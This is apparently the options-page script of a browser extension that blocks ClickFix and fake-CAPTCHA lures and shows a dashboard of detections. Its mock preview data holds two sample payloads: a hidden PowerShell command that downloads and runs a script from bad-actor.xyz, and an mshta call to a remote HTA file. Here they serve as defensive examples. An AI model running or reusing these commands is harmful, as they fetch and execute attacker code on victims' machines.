// ============================================================
// Click Fixed — Options Page Script
// Loads/saves settings to chrome.storage.local.
// Renders the user-friendly dashboard and threat timeline.
// ============================================================

// Fallback mock for standard browser preview
if (typeof chrome === 'undefined' || !chrome.storage || !chrome.storage.local) {
  window.chrome = {
    storage: {
      local: {
        get: function(keys) {
          const mockData = {
            totalBlocked: 4,
            detections: [
              {
                victim_url: 'https://victim-portal.com/help-desk/login',
                timestamp: Date.now() - 60000,
                ai_confidence: 'Malicious clipboard hijack command detected: Win+R Captcha Lure',
                raw_payload: 'powershell.exe -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://bad-actor.xyz/p.ps1\')"'
              },
              {
                victim_url: 'https://legit-banking.org/personal',
                timestamp: Date.now() - 360000,
                ai_confidence: 'Malicious Captcha DOM injection detected: clearfake hta update',
                raw_payload: 'mshta "http://clearfake-domain.info/update.hta"'
              }
            ],
            aiMode: 'Gemini Nano'
          };
          return Promise.resolve(mockData);
        }
      },
      onChanged: {
        addListener: function() {}
      }
    }
  };
}

const DEFAULT_AGENT_URL = 'https://your-cloud-run-url.run.app';

document.addEventListener('DOMContentLoaded', async () => {

  await initDashboard();
  
  // Auto-check agent connection status on load
  await checkAgentOnLoad();
  
  // Live updates when storage changes
  chrome.storage.onChanged.addListener((changes) => {
    if (changes.detections || changes.totalBlocked || changes.aiMode) {
      initDashboard();
    }
  });
});

async function initDashboard() {
  const data = await chrome.storage.local.get([
    'totalBlocked', 
    'detections', 
    'aiMode'
  ]);
  
  // Render stats
  renderStats(data.totalBlocked || 0, data.aiMode || 'Detecting...');
  
  // Render threat feed
  renderActivityFeed(data.detections || []);
}

function renderStats(totalBlocked, aiMode) {
  document.getElementById('totalBlocked').textContent = totalBlocked;
  
  const aiModeEl = document.getElementById('aiModeText');
  if (aiMode.includes('Nano') || aiMode.includes('Edge')) {
    aiModeEl.textContent = 'Gemini Nano';
    aiModeEl.className = 'stat-val text-nano';
  } else if (aiMode.includes('Downloading')) {
    aiModeEl.textContent = 'Nano Downloading...';
    aiModeEl.className = 'stat-val text-warning';
  } else if (aiMode.includes('Cloud') || aiMode.includes('Fallback')) {
    aiModeEl.textContent = 'Gemini Flash';
    aiModeEl.className = 'stat-val text-cloud';
  } else {
    aiModeEl.textContent = 'Detecting...';
    aiModeEl.className = 'stat-val';
  }
}

function renderActivityFeed(detections) {
  const feed = document.getElementById('activityFeed');
  const emptyState = document.getElementById('emptyState');
  
  if (!feed || !emptyState) return;
  
  // Remove existing dynamic feed items
  feed.querySelectorAll('.feed-item').forEach(el => el.remove());

  if (!detections || detections.length === 0) {
    emptyState.style.display = 'flex';
    return;
  }
  
  emptyState.style.display = 'none';
  
  // Show up to 10 recent detections
  detections.slice(0, 10).forEach(d => {
    const item = document.createElement('div');
    item.className = 'feed-item';
    
    let domain = 'Unknown site';
    try {
      if (d.victim_url) {
        domain = new URL(d.victim_url).hostname;
      }
    } catch (e) {
      domain = d.victim_url || 'Unknown site';
    }
    
    const dateStr = d.timestamp ? new Date(d.timestamp).toLocaleString() : new Date().toLocaleString();
    const reason = d.ai_confidence || 'Blocked social engineering payload';
    const payload = d.raw_payload || d.payload || '';
    
    item.innerHTML = `
      <div class="feed-item-header">
        <div class="feed-item-title">
          <span class="feed-threat-badge">Blocked</span>
          <span class="feed-domain">${escapeHtml(domain)}</span>
        </div>
        <span class="feed-time">${escapeHtml(dateStr)}</span>
      </div>
      <p class="feed-reason">${escapeHtml(reason)}</p>
      ${payload ? `<div class="feed-payload"><code class="feed-code">${escapeHtml(payload.slice(0, 250))}${payload.length > 250 ? '...' : ''}</code></div>` : ''}
    `;
    feed.appendChild(item);
  });
}

async function checkAgentOnLoad() {
  const cloudText = document.getElementById('cloudStatusText');
  if (!cloudText) return;

  const baseUrl = DEFAULT_AGENT_URL.replace(/\/$/, '');
  const cardUrl = `${baseUrl}/.well-known/agent-card.json`;
  
  try {
    const response = await fetch(cardUrl, {
      signal: AbortSignal.timeout(6_000)
    });
    if (response.ok) {
      const card = await response.json();
      const name = card?.name || card?.displayName || 'ADK Agent';
      
      cloudText.textContent = 'Online';
      cloudText.className = 'stat-val text-online';
      console.log(`[ClickFixed] Cloud Threat Agent connected: ${name}`);
    } else {
      setOfflineState(`HTTP ${response.status}`);
    }
  } catch (err) {
    setOfflineState(err.name === 'TimeoutError' ? 'Timeout' : 'Unreachable');
  }

  function setOfflineState(msg) {
    cloudText.textContent = 'Offline';
    cloudText.className = 'stat-val text-offline';
    console.info(`[ClickFixed] Cloud Threat Agent is offline: ${msg}`);
  }
}

// Helper to escape HTML characters
function escapeHtml(str) {
  if (!str) return '';
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}
